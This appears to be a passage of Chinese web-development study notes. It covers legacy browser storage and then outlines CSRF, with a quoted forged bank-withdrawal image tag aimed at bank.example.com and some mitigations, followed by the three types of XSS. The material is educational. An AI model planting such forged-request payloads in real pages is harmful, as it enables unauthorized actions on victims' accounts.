  缺点：IE不支持、不能实现数据的持久保存。

  **globalStorage**

  使用于Firefox2+的火狐浏览器，类似于IE的userData。

  ```
  1 //赋值 2 globalStorage[location.hostname]['name'] = 'tugai'; 3 //读取 4 globalStorage[location.hostname]['name']; 5 //删除 6 globalStorage[location.hostname].removeItem('name');
  ```

  缺点：IE不支持。

  **localStorage**

  localStorage是Web Storage互联网存储规范中的一部分，现在在Firefox 3.5、Safari 4和IE8中得到支持。

  缺点：低版本浏览器不支持。

  结论：
  Flash shareobject是不错的选择，如果你不想在页面上嵌入Flash，可以结合使用userData(IE6+)和globalStorage(Firefox2+)和localStorage(chrome3+)实现跨浏览器。

# 网络攻击

### 跨站请求伪造（CSRF）

- 维基百科已经给了一个比较好的[CSRF](https://developer.mozilla.org/en-US/docs/Glossary/CSRF)例子。比如在不安全聊天室或论坛上的一张图片，它实际上是一个给你银行服务器发送提现的请求：

  ```js
  <img src="http://bank.example.com/withdraw?account=bob&amount=1000000&for=mallory">
  ```

- 当你打开含有了这张图片的HTML页面时，如果你之前已经登录了你的银行帐号并且Cookie仍然有效（还没有其它验证步骤），你银行里的钱很可能会被自动转走。有一些方法可以阻止此类事件的发生：

  - 对用户输入进行过滤来阻止；
  - 任何敏感操作都需要确认；
  - 用于敏感信息的Cookie只能拥有较短的生命周期；

回放攻击

[DoS attacks](https://developer.mozilla.org/en-US/docs/Glossary/DoS_attack) 

## 跨站脚本攻击(Cross-site scripting)

### 概述

+ 跨站脚本攻击Cross-site scripting (XSS)是一种安全漏洞，攻击者可以利用这种漏洞在网站上**注入恶意的客户端代码**。当被攻击者登陆网站时就会自动运行这些恶意代码，从而，攻击者可以突破网站的访问权限，冒充受害者。
+ 如果Web应用程序没有部署足够的安全验证，那么，这些攻击很容易成功。浏览器无法探测到这些恶意脚本是不可信的，所以，这些脚本可以任意读取cookie，session tokens，或者其它敏感的网站信息，或者让恶意脚本重写HTML内容。
+   在以下2种情况下，容易发生XSS攻击：
  + 数据从一个**不可靠的链接**进入到一个web应用程序。
  + 没有过滤掉恶意代码的动态内容被发送给web用户。
+ 恶意内容一般包括 JavaScript，但是，有时候也会包括HTML，FLASH。XSS攻击的形式千差万别，但是，它们的共同点为：将一些隐私数据像cookie、session发送给攻击者，将受害者**重定向**到一个由攻击者控制的网站，在受害者的机器上进行一些恶意操作。

### XSS的种类

+ XSS攻击可以分为3类：存储型（持久型）、反射型（非持久型）、基于DOM。

**存储型XSS**

+ 注入型脚本永久存储在目标服务器上。当浏览器请求数据时，脚本从服务器上传回并执行。

**反射型XSS**

+ 当用户点击一个恶意链接，或者提交一个表单，或者进入一个恶意网站时，注入脚本进入被攻击者的网站。Web服务器将注入脚本，比如一个错误信息，搜索结果等 返回到用户的浏览器上。浏览器会执行这段脚本，因为，它认为这个响应来自可信任的服务器。

**基于DOM的XSS**

+ 被执行的恶意脚本会修改页面脚本结构。

- 

+ 